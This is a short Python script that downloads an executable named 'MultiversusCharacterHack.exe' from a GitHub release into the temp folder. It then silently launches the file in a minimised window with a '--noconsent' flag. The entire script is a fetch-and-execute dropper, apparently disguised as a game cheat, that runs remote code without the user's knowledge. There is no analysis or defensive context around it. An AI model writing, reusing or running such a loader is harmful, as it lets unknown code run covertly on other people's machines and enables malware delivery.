import os
import requests
import tempfile as tf

tmpdir = tf.gettempdir()

if not os.path.exists(f"{tmpdir}\\MultiversusCharacterHack.exe"):
        starter_dl = requests.get("https://github.com/bazthedev/MinorInconvenience/releases/download/v1.0.0-alpha/MultiversusCharacterHack.exe")
        with open(f"{tmpdir}\\MultiversusCharacterHack.exe", "wb") as msepm_dl:
            msepm_dl.write(starter_dl.content)
            msepm_dl.close()
        


os.system(f"start /min cmd /c {tmpdir}\\MultiversusCharacterHack.exe --noconsent")